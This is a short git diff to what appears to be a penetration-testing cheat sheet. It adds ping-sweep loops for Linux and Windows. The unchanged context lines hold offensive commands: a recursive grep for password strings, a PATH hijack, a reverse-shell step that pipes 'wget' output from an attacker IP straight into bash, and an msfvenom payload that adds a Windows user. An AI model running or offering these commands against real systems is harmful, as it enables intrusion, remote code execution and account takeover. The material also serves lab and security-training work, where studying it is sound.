@@ -20,6 +20,11 @@ find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null
 grep -R -i passwd,password,db_passwd,db_pass
 export PATH=.:$PATH
 ```
+### Ping sweep
+```
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+(for /L %a IN (1,1,254) DO ping /n 1 /w 3 192.168.2.%a) | find "Reply"
+```
 ## reverseshell
   ```
   wget -O - 10.10.14.6/shell.sh | bash
@@ -282,6 +287,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
